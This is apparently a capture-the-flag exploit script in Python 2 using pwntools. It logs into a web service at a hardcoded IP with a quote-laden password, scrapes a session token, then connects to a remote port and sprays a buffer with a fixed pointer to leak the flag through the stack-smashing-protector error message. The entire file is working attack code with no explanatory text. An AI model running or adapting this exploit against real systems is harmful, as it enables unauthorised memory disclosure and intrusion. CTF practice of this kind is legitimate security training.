HOST, PORT = '178.128.84.72', 9997
from pwn import *
import requests

sess = requests.Session()
r = sess.get('http://' + HOST + '/login.php?username=' + 'ey32569' + '&password=yoyoyo%27')
r = sess.get('http://' + HOST + '/courses.php')
token = r.text.split('Token: ')[1][:64]
cnt = int(r.text.split('Enrolled: ')[1].split(' ')[0])
print `token`, cnt

r = remote(HOST, PORT)
r.sendline(token)
flag_ptr = 0x604070
for i in range(5):
	r.recvuntil('name?')
	r.send(p64(flag_ptr) * (0x400 / 8))
data = r.recvuntil('again', timeout=1)
if 'again' not in data:
	r.recvuntil('name?')
	r.send(p64(flag_ptr) * (0x400 / 8))

data = r.recvuntil(' up', timeout=3)
if ' up' in data:
	r.sendline('3')
	data = r.recv(10240)
	print `data`
	if ' up' not in data:
		print r.recvall() # SSP & flag